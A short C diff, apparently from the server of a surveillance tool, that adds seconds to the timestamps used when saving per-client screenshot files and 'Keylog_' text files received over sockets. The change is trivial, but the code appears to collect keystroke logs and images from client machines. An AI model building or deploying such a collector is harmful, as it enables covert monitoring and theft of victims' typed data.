@@ -76,7 +76,7 @@ void handleOpcode(message_t msg, int clientSock)
         time_t now = time(NULL);
         struct tm *t = localtime(&now);
         char timestamp[64];
-        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);
 
         snprintf(filename, BUFFER_SIZE * 2, "%s/%s_%s.jpg", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name, timestamp);
         recvFile(clientSock, filename);
@@ -113,7 +113,7 @@ void *handle_client(void *params)
         time_t now = time(NULL);
         struct tm *t = localtime(&now);
         char timestamp[64];
-        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);
 
         snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt", clientHndler.clientsAttr[args->client_sock].name, clientHndler.clientsAttr[args->client_sock].name, timestamp);
         rename(filename, newFn);
